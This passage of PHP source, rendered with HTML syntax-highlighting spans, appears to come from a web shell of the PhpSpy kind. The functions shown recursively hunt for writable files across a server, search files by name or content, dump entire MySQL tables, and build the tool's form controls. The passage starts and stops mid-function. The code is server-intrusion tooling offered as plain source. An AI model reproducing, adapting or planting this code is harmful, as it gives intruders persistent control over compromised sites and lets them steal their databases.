<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dirdata[$j]['server_link']=$f;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $j++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   GetWDirList($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   closedir($dh);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   clearstatcache();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return $dirdata;
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

function GetWFileList($dir){
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $filedata,$j,$nowpath, $writabledb;
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$j &amp;&amp; $j=1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($dh = opendir($dir)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while ($file = readdir($dh)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $ext = getext($file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $f=str_replace('//','/',$dir.'/'.$file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   GetWFileList($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_file($f) &amp;&amp; in_array($ext, <span style="text-decoration: underline;">explode(',', $writabledb))){</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_writable($f)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['filename']=str_replace($nowpath,'',$f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['size']=sizecount(@filesize($f));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['filechmod']=getChmod($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['fileperm']=getPerms($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['fileowner']=getUser($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['dirlink']=$dir;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['server_link']=$f;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $j++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   closedir($dh);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   clearstatcache();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return $filedata;
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

function GetSFileList($dir, $content, $re = 0) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $filedata,$j,$nowpath, $writabledb;
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$j &amp;&amp; $j=1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($dh = opendir($dir)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while ($file = readdir($dh)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $ext = getext($file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $f=str_replace('//','/',$dir.'/'.$file);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   GetSFileList($f, $content, $re = 0);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_file($f) &amp;&amp; in_array($ext, <span style="text-decoration: underline;">explode(',', $writabledb))){</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $find = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($re) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$c<span style="text-decoration: underline;">ontent.'@', @file_get_contents($f)) ){</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $find = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ( strstr($file, $content) || strstr( @file_get_contents($<span style="text-decoration: underline;">f),$content ) ) {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $find = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($find) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['filename']=str_replace($nowpath,'',$f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['size']=sizecount(@filesize($f));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['filechmod']=getChmod($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['fileperm']=getPerms($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['fileowner']=getUser($f);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['dirlink']=$dir;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filedata[$j]['server_link']=$f;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $j++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   closedir($dh);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   clearstatcache();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return $filedata;
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

function qy($sql) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $mysqllink;
<span style="color: #969896; background-color: #1d1f21;"> </span>   //echo $sql.'&lt;br&gt;';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $res = $error = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(!$res = @mysql_query($sql,$mysqllink)) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else if(is_resource($res)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return 1;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return 2;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }<span style="color: #de935f; background-color: #373b41;">   </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   return 0;
}

function q($sql) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $mysqllink;
<span style="color: #969896; background-color: #1d1f21;"> </span>   return @mysql_query($sql,$mysqllink);
}

function fr($qy){
<span style="color: #969896; background-color: #1d1f21;"> </span>   mysql_free_result($qy);
}

function sizecount($fileSize) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $size = sprintf("%u", $fileSize);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($size == 0) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   return '0 Bytes' ;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB',<span style="text-decoration: underline;"> ' YB');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizen<span style="text-decoration: underline;">ame[$i];</span>
}
// &#22791;&#20221;&#25968;&#25454;&#24211;
function sqldumptable($table, $fp=0) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $mysqllink;

<span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledump = "DROP TABLE IF EXISTS `$table`;\n";
<span style="color: #969896; background-color: #1d1f21;"> </span>   $res = q("SHOW CREATE TABLE $table");
<span style="color: #969896; background-color: #1d1f21;"> </span>   $create = mysql_fetch_row($res);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledump .= $create[1].";\n\n";

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($fp) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fwrite($fp,$tabledump);
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo $tabledump;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledump = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $rows = q("SELECT * FROM $table");
<span style="color: #969896; background-color: #1d1f21;"> </span>   while ($row = mysql_fetch_assoc($rows)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($row as $k=&gt;$v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $row[$k] = "'".@mysql_real_escape_string($v)."'";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');<span style="text-decoration: underline;">'."\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($fp) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fwrite($fp,$tabledump);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo $tabledump;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   fwrite($fp,"\n\n");
<span style="color: #969896; background-color: #1d1f21;"> </span>   fr($rows);
}

function p($str){
<span style="color: #969896; background-color: #1d1f21;"> </span>   echo $str."\n";
}

function tbhead() {
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;');
}
function tbfoot(){
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/table&gt;');
}

function makehide($name,$value=''){
<span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;");
}

function makeinput($arg = array()){
<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['size'] = $arg['size'] &gt; 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$arg['type'] &amp;&amp; $arg['type'] = 'text';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['title'] = $arg['title'] ? $arg['title'].'&lt;br /&gt;' : '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['newline']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$<span style="text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg<span style="text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

function makeselect($arg = array()){
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['onchange']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $onchange = 'onchange="'.$arg['onchange'].'"';
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $arg['title'] = $arg['title'] ? $arg['title'] : '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['newline']) p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p("$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"<span style="text-decoration: underline;"> $onchange&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_array($arg['option'])) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['nokey']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($arg['option'] as $value) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['selected']==$value) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;option value=\"$value\"&gt;$value&lt;/option&gt;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($arg['option'] as $key=&gt;$value) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['selected']==$key) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;option value=\"$key\"&gt;$value&lt;/option&gt;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;/select&gt;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($arg['newline']) p('&lt;/p&gt;');
}
function formhead($arg = array()) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $self;
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$arg['method'] &amp;&amp; $arg['method'] = 'post';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$arg['action'] &amp;&amp; $arg['action'] = $self;
